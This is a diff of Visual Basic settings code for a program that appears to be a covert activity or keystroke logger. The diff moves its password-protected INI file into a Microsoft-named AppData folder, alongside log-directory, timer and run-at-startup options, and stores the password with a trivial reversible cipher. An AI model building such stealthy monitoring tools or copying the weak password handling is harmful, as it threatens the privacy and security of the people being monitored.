@@ -659,9 +659,9 @@ Call GetUname
     Me.Move (Screen.Width - Me.Width) / 2, (Screen.Height - Me.Height) / 2
 
 
-If Dir("C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI") <> "" Then
+If Dir("C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI") <> "" Then
     txtPwd = frmMain.upwd.Text 'Use main forms password here
-    txtLogDir.Text = INIRead("LogSetting", "LogDir", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
+    txtLogDir.Text = INIRead("LogSetting", "LogDir", "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI")
     txtLogDir.Visible = False
     Call txtPwd_Change
 Else
@@ -673,19 +673,19 @@ End Sub
 Public Sub loadsettings()
 
     txtLogDir.Visible = True
-    Check2.Value = INIRead("LogSetting", "USEBS", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
-    Check1.Value = INIRead("LogSetting", "UseChildTitle", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
-    Slider1.Value = INIRead("LogSetting", "EncCode", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
-    Text2.Text = INIRead("LogSetting", "extension", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
-    Slider2.Value = INIRead("LogSetting", "TimerInt", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
-    txtLogDir.Text = INIRead("LogSetting", "LogDir", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
-    txtNPwd.Text = INIRead("LogSetting", "Pwd", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
-    Check4.Value = INIRead("LogSetting", "SETRUNONCE", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
-    Check3.Value = INIRead("LogSetting", "sLogging", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
+    Check2.Value = INIRead("LogSetting", "USEBS", "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI")
+    Check1.Value = INIRead("LogSetting", "UseChildTitle", "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI")
+    Slider1.Value = INIRead("LogSetting", "EncCode", "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI")
+    Text2.Text = INIRead("LogSetting", "extension", "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI")
+    Slider2.Value = INIRead("LogSetting", "TimerInt", "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI")
+    txtLogDir.Text = INIRead("LogSetting", "LogDir", "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI")
+    txtNPwd.Text = INIRead("LogSetting", "Pwd", "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI")
+    Check4.Value = INIRead("LogSetting", "SETRUNONCE", "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI")
+    Check3.Value = INIRead("LogSetting", "sLogging", "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI")
 
 
     Dim logmode As Integer
-    logmode = INIRead("LogSetting", "LogMode", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
+    logmode = INIRead("LogSetting", "LogMode", "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI")
     Select Case logmode
     Case 0
     Option1.Value = True
@@ -703,22 +703,22 @@ Dir1.Path = txtLogDir.Text
 
 If Right(txtLogDir.Text, 1) = "\" Then txtLogDir.Text = Mid(txtLogDir.Text, 1, Len(txtLogDir) - 1)
 
-IniWrite "LogSetting", "USEBS", Check2.Value, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
-IniWrite "LogSetting", "UseChildTitle", Check1.Value, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
-IniWrite "LogSetting", "EncCode", Slider1.Value, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
-IniWrite "LogSetting", "extension", Text2.Text, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
-IniWrite "LogSetting", "TimerInt", Slider2.Value, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
-IniWrite "LogSetting", "LogDir", txtLogDir.Text, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
-IniWrite "LogSetting", "Pwd", encrypt(txtNPwd.Text, 10), "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
-IniWrite "LogSetting", "SETRUNONCE", Check4.Value, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
-IniWrite "LogSetting", "sLogging", Check3.Value, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
+IniWrite "LogSetting", "USEBS", Check2.Value, "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI"
+IniWrite "LogSetting", "UseChildTitle", Check1.Value, "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI"
+IniWrite "LogSetting", "EncCode", Slider1.Value, "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI"
+IniWrite "LogSetting", "extension", Text2.Text, "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI"
+IniWrite "LogSetting", "TimerInt", Slider2.Value, "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI"
+IniWrite "LogSetting", "LogDir", txtLogDir.Text, "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI"
+IniWrite "LogSetting", "Pwd", encrypt(txtNPwd.Text, 10), "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI"
+IniWrite "LogSetting", "SETRUNONCE", Check4.Value, "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI"
+IniWrite "LogSetting", "sLogging", Check3.Value, "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI"
 
 If Option1.Value = True Then
-IniWrite "LogSetting", "LogMode", "0", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
+IniWrite "LogSetting", "LogMode", "0", "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI"
 ElseIf Option2.Value = True Then
-IniWrite "LogSetting", "LogMode", "1", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
+IniWrite "LogSetting", "LogMode", "1", "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI"
 ElseIf Option3.Value = True Then
-IniWrite "LogSetting", "LogMode", "2", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
+IniWrite "LogSetting", "LogMode", "2", "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI"
 End If
 
 
@@ -791,9 +791,9 @@ End Sub
 
 Private Sub txtPwd_Change()
 
-If Dir("C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI") <> "" Then
+If Dir("C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI") <> "" Then
     Dim pwd As String
-    pwd = INIRead("LogSetting", "Pwd", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
+    pwd = INIRead("LogSetting", "Pwd", "C:\Users\" & Username & "\AppData\Roaming\Microsoft\SPYXX.INI")
     If encrypt(Left(pwd, Len(pwd) - 1), -10) = txtPwd.Text Or encrypt(Left(pwd, Len(pwd) - 1), -10) = "" Then
 
         Call loadsettings
